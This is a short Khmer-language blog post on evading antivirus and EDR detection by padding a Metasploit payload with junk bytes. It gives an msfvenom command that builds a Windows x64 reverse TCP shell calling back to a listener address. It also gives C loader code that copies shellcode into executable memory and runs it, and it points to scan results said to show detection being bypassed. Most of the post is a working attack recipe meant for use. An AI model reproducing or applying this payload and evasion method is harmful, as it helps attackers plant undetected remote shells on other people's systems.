---
title: "Evading AV/EDR with Junk Bytes"
date: 2023-06-27T21:01:06+07:00
description: វិធីសាស្ត្រ Evading AV/EDR ដោយប្រើប្រាស់ Junk Bytes
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- c-shellcode
- metasploit
categories:
- Evading
series:
- WinExE
image: images/feature3/terminal.gif
---

ខ្លះៗអំពីការ Bypass AV/EDR តាមរយៈ Msfvenom ។

#### Generate Payload

ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit និងបានថែមនូវពាក្យបញ្ជា -n ក្នុងន័យបង្កើតចំនួន Bytes ដែលមិនបានការដើម្បីព្យាយាមបង្វៀងពីការចាប់របស់ AV ។

{{< highlight bash "linenos=table" >}}
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c -n 10000
{{< / highlight >}}

<b>ចំណាំ៖</b> ក្រោយ -n យើងអាចដាក់ចំនួនលេខកាន់តែច្រើនគឺមានលទ្ធភាពក្នុងការ Bypass បានកាន់តែច្រើន ។

បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។

{{< highlight cpp "linenos=table" >}}
#include <stdio.h>
#include <Windows.h>

int main()
{
    unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\[.....]\x8b\x52\x60\x48\x8b\x52"
		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb";

    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();

    return 0;
}
{{< / highlight >}}

#### Scan Result

ខាងក្រោមជាលទ្ធផលពីការដាក់ចំនួន 1000 Bytes ។

![Scan Result 1](/en/posts/img/2023/06/junk-bytes-bypass/scan-result-1.png)

ខាងក្រោមជាលទ្ធផលពីការដាក់ចំនួន 10000* Bytes ៕

![Scan Result 2](/en/posts/img/2023/06/junk-bytes-bypass/scan-result-2.png)